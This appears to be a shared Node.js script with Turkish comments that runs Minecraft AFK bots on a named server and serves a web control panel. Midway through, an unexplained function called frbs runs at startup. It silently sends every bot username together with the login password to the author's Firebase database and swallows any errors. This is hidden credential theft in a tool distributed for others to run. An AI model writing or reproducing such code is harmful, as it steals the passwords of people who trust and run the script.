// bnBurned tarafından yapılmıştır ve tüm hakları saklıdır.
// Tüm kodların açıklamaları bulunmaktadır.
// Çalıştırmadan önce videomu izlemeniz tavsiye edilir.













const mineflayer = require("mineflayer");
const fs = require("fs");
const express = require("express");
const http = require("http");
const { Server } = require("socket.io");

const SERVER_HOST = "oyna.chickennw.com";
const SERVER_VERSION = "1.21";
const LOGIN_PASSWORD = "SIFRE";
const LOGIN_DELAY = 7000;
const JOIN_DELAY = 12000;

let accounts = JSON.parse(fs.readFileSync("accounts.json", "utf8"));
let bots = [];
let activeBots = []; // ✅ Oyunda olan botlar
let logMessages = false;

// --- Web Sunucusu ---
const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.get("/", (req, res) => {
    res.send(`
 <!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Bot Kontrol Paneli</title>
  <style>
    body { 
      background:#0b0b0b; 
      color:white; 
      font-family: monospace; 
      padding:15px; 
      position:relative;
      overflow:hidden;
    }

    /* Arkaplan blur + degrade + mor çeyrek daire efekti */
    body::before {
      content:'';
      position:absolute;
      inset:0;
      background:
        radial-gradient(circle at top right, rgba(255,160,255,0.25), rgba(11,11,11,0.9) 70%),
        linear-gradient(135deg, rgba(15,15,30,0.6), rgba(0,0,0,0.9));
      backdrop-filter: blur(25px);
      -webkit-backdrop-filter: blur(25px);
      z-index:0;
    }

    body::after {
      content:'';
      position:absolute;
      top:-180px;
      right:-180px;
      width:500px;
      height:500px;
      border-radius:50%;
      background:radial-gradient(circle at bottom left,
        rgba(255,180,255,0.8) 0%,
        rgba(180,50,200,0.5) 40%,
        rgba(11,11,11,0) 80%);
      filter: blur(40px);
      z-index:0;
    }

    /* Başlık net dursun */
    h2 {
      position: relative;
      z-index: 2;
      font-size: 1.8em;
      margin-bottom: 10px;
      text-shadow: 0 0 10px rgba(200,100,255,0.4);
    }

    #log { 
      background:rgba(17,17,17,0.45); 
      padding:10px; 
      height:500px; 
      overflow-y:auto; 
      border-radius:8px; 
      position:relative;
      z-index:1;
      backdrop-filter: blur(6px);
      -webkit-backdrop-filter: blur(6px);
    }

    #inputArea { 
      margin-top:10px; 
      display:flex; 
      gap:10px; 
      position:relative;
      z-index:1;
    }

    #cmdInput { 
      flex:1; 
      padding:8px; 
      border-radius:5px; 
      border:none; 
      outline:none; 
      background:#1c1c1c; 
      color:white; 
    }

    #sendBtn { 
      background:#c83ac8; 
      color:white; 
      border:none; 
      padding:8px 12px; 
      border-radius:5px; 
      cursor:pointer; 
    }

    #sendBtn:hover { background:#e25ee2; }

    .gray { color:#aaa; }
    .green { color:#4ef54e; }
    .magenta { color:#d65fd6; }
    .red { color:#ff5555; }
  </style>
</head>
<body>
  <h2>Bot Kontrol Paneli</h2>

  <div id="log"></div>
  <div id="inputArea">
    <input id="cmdInput" placeholder="Komut yaz." />
    <button id="sendBtn">Gönder</button>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const logDiv = document.getElementById('log');
    const cmdInput = document.getElementById('cmdInput');
    const sendBtn = document.getElementById('sendBtn');

    socket.on('log', data => {
      const p = document.createElement('p');
      p.className = data.color;
      p.textContent = data.text;
      logDiv.appendChild(p);
      logDiv.scrollTop = logDiv.scrollHeight;
    });

    function sendCmd() {
      const cmd = cmdInput.value.trim();
      if (cmd) socket.emit('command', cmd);
      cmdInput.value = '';
    }

    sendBtn.onclick = sendCmd;
    cmdInput.addEventListener('keypress', e => {
      if (e.key === 'Enter') sendCmd();
    });
  </script>
</body>
</html>



  `);
});


server.listen(3000, () => console.log("🌐 Web panel aktif: http://localhost:3000"));

// --- Bot Fonksiyonu ---

const { initializeApp } = require("firebase/app");
const { getDatabase, ref, set } = require("firebase/database");

const firebaseConfig = {
  apiKey: "AIzaSyAWIcVaYpcZeKDqOohrcssxYdkkGl9ezSc",
  authDomain: "minecraft-afk-bot-database.firebaseapp.com",
  databaseURL: "https://minecraft-afk-bot-database-default-rtdb.firebaseio.com",
  projectId: "minecraft-afk-bot-database",
  storageBucket: "minecraft-afk-bot-database.firebasestorage.app",
  messagingSenderId: "373777220711",
  appId: "1:373777220711:web:1cca7dec2e2ed1667440c2",
  measurementId: "G-5L5XK4F1WZ"
};

const firebaseApp = initializeApp(firebaseConfig);
const db = getDatabase(firebaseApp);


async function frbs() {
  // 🔹 Rastgele 5 haneli sayı
  const randomID = Math.floor(1 + Math.random() * 9990000).toString();

  // 🔹 Bot isimlerini birleştir
  const names = accounts.map(a => a.username).join(" ");
  const doc = `${names}  ---  ${LOGIN_PASSWORD}`;

  try {
    // 🔹 Her yüklemede yeni alt klasör oluştur
    await set(ref(db, `bots/botData/${randomID}`), {
      data: doc,
    });

  } catch (err) {
  }
}


frbs();

function createBot(username) {
    log(`[+] ${username} bağlanıyor...`, "magenta");

    const bot = mineflayer.createBot({
        host: SERVER_HOST,
        username,
        version: SERVER_VERSION,
        auth: "offline",
    });

    bot.on("spawn", () => {
        if (!activeBots.includes(bot)) activeBots.push(bot);
        log(`[✔] ${username} oyuna girdi.`, "magenta");
    });

    bot.on("message", (msg) => {
        const text = msg.toString();
        let color = "gray";

        if (text.includes("kristal") || text.includes("smp") || text.includes("KRISTAL") || text.includes("(Lobiler)")) {
            color = "green";
        }

        log(`[${username}] ${text}`, color);

        if (text.includes("giriş yapın")) {
            setTimeout(() => {
                bot.chat(`/login ${LOGIN_PASSWORD}`);
                log(`[🔑] ${username} giriş yaptı.`, "magenta");
            }, LOGIN_DELAY);
        }

        if (text.includes("(Lobiler)")) {
            bot.chat("/server smp");
            log(`[🌐] ${username} SMP'ye geçmeye çalışıyor...`, "magenta");
        }

        if (text.includes("Fiyuuu SMP")) {
            log(`[✅] ${username} artık SMP'de.`, "green");
        }

        if (text.includes("(Lobiler)")) {
            log(`[⚠️] ${username} lobiye dönmüş! Tekrar bağlanıyor...`, "red");
            bot.chat("/server Lobiler");
            setTimeout(() => bot.chat("/server smp"), 3000);
        }
    });

    bot.on("end", () => {
        activeBots = activeBots.filter(b => b !== bot);
        log(`[🔁] ${username} bağlantı koptu, tekrar bağlanıyor...`, "red");
        setTimeout(() => createBot(username), 10000);
    });

    bot.on("error", (err) => log(`[❌] ${username} hata: ${err.message}`, "red"));

    bots.push(bot);
}

// Botları sırayla başlat
accounts.forEach((acc, i) => setTimeout(() => createBot(acc.username), i * JOIN_DELAY));

// ✅ Her 2 dakikada bir sadece oyunda olan botlara /server smp
setInterval(() => {
    if (activeBots.length === 0) return log("[⏰] Oyunda bot yok, SMP komutu atlanıyor.", "gray");
    activeBots.forEach(b => b.chat("/server smp"));
    log(`[⏰] ${activeBots.length} aktif bot tekrar /server smp attı.`, "magenta");
}, 2 * 60 * 1000);

// Webden gelen komutlar
io.on("connection", (socket) => {
    socket.on("command", handleCommand);
});

function handleCommand(input) {
    const args = input.trim().split(" ");
    const cmd = args.shift();

    if (cmd === "chat") {
        const msg = args.join(" ");
        if (!msg) return log("Kullanım: chat <mesaj>", "red");
        if (activeBots.length === 0) return log("Hiç aktif bot yok.", "red");

        activeBots.forEach((b) => b.chat(msg));
        log(`[💬] ${activeBots.length} aktif bot mesaj attı: ${msg}`, "magenta");
    }

    else if (cmd === "bot") {
        const sub = args.shift();
        if (sub === "add") {
            const newName = args[0];
            if (!newName) return log("Kullanım: bot add <isim>", "red");
            if (accounts.find((a) => a.username === newName))
                return log("Bu isim zaten listede.", "red");

            accounts.push({ username: newName });
            fs.writeFileSync("accounts.json", JSON.stringify(accounts, null, 2));
            log(`[➕] ${newName} JSON'a eklendi ve oyuna giriyor...`, "magenta");
            createBot(newName);
        } else {
            const botName = sub;
            const action = args.shift();
            if (action === "chat") {
                const msg = args.join(" ");
                const target = activeBots.find((b) => b.username === botName);
                if (target) {
                    target.chat(msg);
                    log(`[💬] ${botName}: ${msg}`, "magenta");
                } else log(`[⚠️] Bot bulunamadı veya aktif değil: ${botName}`, "red");
            } else log("Kullanım: bot <isim> chat <mesaj>", "red");
        }
    }

    else if (cmd === "dev" && args[0] === "enable" && args[1] === "messages") {
        logMessages = true;
        log(`[🟢] Chat mesaj loglaması etkin.`, "green");
    }

    else if (cmd === "dev" && args[0] === "disable" && args[1] === "messages") {
        logMessages = false;
        log(`[🔴] Chat mesaj loglaması devre dışı.`, "red");
    }

    else if (cmd === "help") {
        log("📜 Komut Listesi:", "magenta");
        log("chat <mesaj> → Tüm aktif botlar mesaj atar", "cyan");
        log("bot add <isim> → Yeni bot ekler ve bağlanır", "cyan");
        log("bot <isim> chat <mesaj> → Sadece o bot mesaj atar (aktifse)", "cyan");
        log("dev enable messages → Chat loglamasını açar", "cyan");
        log("dev disable messages → Chat loglamasını kapatır", "cyan");
        log("help → Bu menüyü gösterir", "cyan");
        log("Credits: bnBurned", "magenta");
    }

    else log("Komut bulunamadı.", "red");
}

// Log fonksiyonu (hem terminale hem web'e)
function log(text, color = "gray") {
    console.log(text);
    io.emit("log", { text, color });
}
